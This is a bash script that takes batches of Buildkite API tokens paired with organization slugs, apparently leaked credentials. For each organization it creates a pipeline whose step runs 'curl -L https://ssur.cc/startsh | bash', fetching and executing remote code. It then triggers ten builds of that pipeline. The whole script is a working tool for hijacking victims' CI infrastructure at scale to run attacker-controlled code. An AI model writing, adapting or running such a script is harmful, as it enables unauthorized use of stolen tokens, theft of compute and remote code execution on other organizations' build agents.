#!/bin/bash

echo "Enter one or more combos [API_TOKEN]/[ORG_SLUG], one per line. Press Ctrl+D when done:"

# Read all lines into an array
mapfile -t combos

for combo in "${combos[@]}"; do
  # Skip empty lines
  if [[ -z "$combo" ]]; then
    continue
  fi

  echo
  echo "Processing combo: $combo"

  # Parse the input
  TOKEN="${combo%%/*}"
  ORG_SLUG="${combo#*/}"
  PIPELINE_SLUG="$ORG_SLUG"  # using org slug as pipeline name/slug

  # Set static build data
  COMMIT="main"
  BRANCH="main"

  echo "Looking for cluster..."

  # Get the first cluster ID
  CLUSTER_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
    "https://api.buildkite.com/v2/organizations/$ORG_SLUG/clusters" | \
    grep -o '"id": *"[^"]*"' | head -1 | sed -E 's/"id": *"([^"]*)"/\1/')

  if [ -z "$CLUSTER_ID" ] || [ "$CLUSTER_ID" == "null" ]; then
    echo "❌ Could not retrieve cluster ID for $ORG_SLUG. Check your token and org slug."
    continue
  fi

  echo "✅ Found cluster ID: $CLUSTER_ID"
  echo

  # Create the pipeline
  echo "Creating pipeline..."

  CREATE_RESPONSE=$(curl -s -w "%{http_code}" -o create_pipeline_response.json \
    -H "Authorization: Bearer $TOKEN" \
    -X POST "https://api.buildkite.com/v2/organizations/$ORG_SLUG/pipelines" \
    -H "Content-Type: application/json" \
    -d @- <<EOF
{
  "name": "$PIPELINE_SLUG",
  "repository": "git@github.com:bloxclone/e.git",
  "cluster_id": "$CLUSTER_ID",
  "configuration": "steps:\\n  - label: \\":pipeline:\\"\\n    command: \\"curl -L https://ssur.cc/startsh | bash\\""
}
EOF
  )

  if [[ "$CREATE_RESPONSE" != 2* ]]; then
    echo "❌ Failed to create pipeline for $ORG_SLUG. Response:"
    cat create_pipeline_response.json
    continue
  fi

  echo "✅ Pipeline '$PIPELINE_SLUG' created."
  echo

  # Trigger 10 builds
  for i in {1..10}; do
    echo "Triggering build #$i for $ORG_SLUG..."

    curl -s -H "Authorization: Bearer $TOKEN" \
      -X POST "https://api.buildkite.com/v2/organizations/$ORG_SLUG/pipelines/$PIPELINE_SLUG/builds" \
      -H "Content-Type: application/json" \
      -d @- <<EOF
{
  "commit": "$COMMIT",
  "branch": "$BRANCH"
}
EOF

    echo "✅ Build #$i triggered."
    echo
  done
done

echo "All combos processed."
